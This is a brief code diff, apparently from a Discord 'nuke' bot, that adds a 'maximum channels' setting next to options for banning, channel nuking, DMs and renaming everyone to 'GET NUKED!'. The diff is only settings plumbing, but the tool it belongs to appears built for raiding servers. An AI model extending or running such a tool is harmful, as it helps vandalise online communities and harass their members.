@@ -649,6 +649,10 @@ async def volume(ctx, value: str, status: bool, arg1: Optional[str], arg2: Optio
 
         lines.append(f"Changed \"nick everyone\" to {status} with a name of \"GET NUKED!\"")
 
+        config_8 = status
+
+        lines.append(f"Changed \"maximum channels\" to {status}")
+
         # save config options
         volume_settings[f"{ctx.message.author.id}"] = {
             "ban": config_1,
@@ -657,7 +661,8 @@ async def volume(ctx, value: str, status: bool, arg1: Optional[str], arg2: Optio
             "server": config_4,
             "nuke_channel": config_5,
             "dm": config_6,
-            "nick": config_7
+            "nick": config_7,
+            "maxchannels": config_8
         }
         await dm_user(ctx.message.author, "\n".join(lines))
     writeVolumeSettings(volume_settings)
